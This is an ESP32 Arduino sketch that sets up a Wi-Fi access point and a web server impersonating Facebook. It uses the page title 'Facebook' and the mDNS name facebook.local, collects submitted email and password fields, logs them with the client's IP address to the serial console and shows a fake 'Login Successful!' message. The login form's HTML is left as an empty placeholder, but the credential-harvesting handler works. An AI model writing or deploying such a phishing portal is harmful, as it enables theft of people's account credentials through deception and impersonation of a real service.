#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>

// Wi-Fi Access Point credentials
const char *ssid = "connect";
const char *password = "password123";

// WebServer object on port 80
WebServer server(80);

// HTML for the login page
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Facebook</title>
    <style>
        /* Your CSS styles go here */
    </style>
</head>
<body>
    <h1>ESP32 Web Server</h1>
</body>
</html>
)rawliteral";

// Function to handle the root URL
void handleRoot() {
    server.send(200, "text/html", loginPage);
}

// Function to handle form submission
void handleFormSubmit() {
    if (server.hasArg("email") && server.hasArg("password")) {
        String email = server.arg("email");
        String password = server.arg("password");
        IPAddress clientIP = server.client().remoteIP();
        
        // Log received data to the Serial Monitor
        Serial.println("Form Submitted:");
        Serial.println("Client IP: " + clientIP.toString());
        Serial.println("Email: " + email);
        Serial.println("Password: " + password);
        
        // Respond back to client
        server.send(200, "text/plain", "Login Successful! Thank you for logging in.");
    } else {
        server.send(400, "text/plain", "Bad Request: Missing email or password.");
    }
}

// Function to print connected devices
void printConnectedDevices() {
    int numStations = WiFi.softAPgetStationNum(); // Get number of connected stations
    Serial.printf("Connected Devices: %d\n", numStations);
    
    // Since softAPgetStationList is not available, we'll just print the number of connected devices
    if (numStations > 0) {
        Serial.println("Devices are connected, but MAC addresses cannot be retrieved with this method.");
    } else {
        Serial.println("No devices connected.");
    }
}

void setup() {
    Serial.begin(115200);
    
    // Start Access Point
    if (WiFi.softAP(ssid, password)) {
        Serial.println("Access Point started successfully!");
        Serial.print("AP IP Address: ");
        Serial.println(WiFi.softAPIP());
    } else {
        Serial.println("Failed to start Access Point.");
        return;
    }
    
    // Start mDNS responder
    if (MDNS.begin("facebook")) { // Hostname set to "facebook"
        Serial.println("mDNS responder started");
        Serial.println("You can now access the ESP32 at http://facebook.local");
    } else {
        Serial.println("Error starting mDNS responder");
    }
    
    // Define URL handlers
    server.on("/", HTTP_GET, handleRoot);             // Serve the login page
    server.on("/submit", HTTP_POST, handleFormSubmit); // Handle form submission
    
    // Start the web server
    server.begin();
    Serial.println("Web server started");
}

void loop() {
    server.handleClient(); // Handle incoming client requests
    delay(5000);           // Check for connected devices every 5 seconds
    printConnectedDevices();
}